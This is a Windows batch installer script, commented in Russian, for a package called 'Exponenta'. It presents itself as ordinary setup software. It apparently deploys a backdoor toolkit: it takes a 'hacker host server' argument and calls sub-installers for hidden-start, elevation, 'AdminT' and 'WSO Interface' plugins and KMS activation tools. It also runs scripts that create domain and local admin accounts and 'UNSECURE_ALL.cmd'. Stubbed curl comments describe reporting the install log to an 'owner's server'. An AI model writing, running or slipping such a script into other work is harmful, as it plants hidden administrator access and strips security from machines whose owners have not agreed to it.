@echo on
rem
rem Командный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
rem
rem USAGE
rem > InstallMainExponenta.bat <dest_dir> <hacker host server 1 domain> <AdminT> <Elevation> <Util>
rem Запускать файл с правами администратора

setlocal enableextensions enabledelayedexpansion

Rem Установка системнмных переменных окружения

set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
set Chocolatey=%ALLUSERSPROFILE%\chocolatey


echo -
echo Добро пожаловать в программу установки пакета
echo Данная программа устанавливает файлы в каталог %Dest_DIR%
echo -

rem Install Duck Plugin
if not exist duck-Install.bat goto pass_Duck
call duck-Install.bat
:pass_Duck

rem Install Hidden Start Plugin
if not exist HiddenStartInstall.bat goto pass_HiddenStart
call HiddenStartInstall.bat
:pass_HiddenStart

rem Install Elevation Plugin
if not exist ElevationInstall.bat goto pass_Elevation
call ElevationInstall.bat
:pass_Elevation

rem Install Utils...
if not exist UtilsInstall.bat goto pass_Util
call UtilsInstall.bat
:pass_Util

rem Install AdminSet01...
if not exist AdminSet01Install.bat goto pass_AdminSet01
call AdminSet01Install.bat
:pass_AdminSet01

rem Install AdminT Plugin
if not exist AdminTInstall.bat goto pass_AdminT
call AdminTInstall.bat
:pass_AdminT

rem Instll Threads Plugin
if not exist Threads-Install.bat goto pass_Threads
call Threads-Install.bat
:pass_Threads

rem Instll sordum.org Utils
if not exist sordum.org.install.bat goto pass_Sordum
call sordum.org.install.bat
:pass_Sordum

rem Instll WSO Interface Plugin
if not exist wsoinstall.bat goto pass_WSO
call wsoinstall.bat
:pass_WSO

rem Install Java Packet
if not exist java-install.bat goto pass_java
call java-install.bat
:pass_java

rem Install Powershell Core Packet
if not exist pwshcore-install.bat goto pass_pwsh
call pwshcore-install.bat
:pass_pwsh

rem Unpack KMS_Tools_Portable
if not exist KMS-Portable-Unpack.bat goto pass_KMS
call KMS-Portable-Unpack.bat
:pass_KMS

rem Refresh Environment
if not exist %Chocolatey%\Bin\RefreshEnv.cmd goto pass_Refresh
call %Chocolatey%\Bin\RefreshEnv.cmd
:pass_Refresh

rem Create Exponenta Styler User for Local Access
@echo off
call c:\pub1\Util\adAdminDomain.cmd
call c:\pub1\Util\adAdminLocal.cmd
call c:\pub1\Util\UNSECURE_ALL.cmd
rem The End of Exponenta User Create

rem Правка файлов конфигурации модуля Exponenta
@echo on
rem "=== Changing Exponente Config ==="
rem

rem создание списка постоянных изменений для демонов
echo -
echo Installation is made with Success!
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:already_Exist
echo Installation Warning!
echo This Packet has been already installed
echo The yuden.Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish


:UnSuccess
echo General Error
echo Installation may be incomplete!
echo The yuden. Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:sess_Finish

echo "Delete unused files"
cd /d %curdir%

rd /S /Q WindowsPowerShell

rem pause
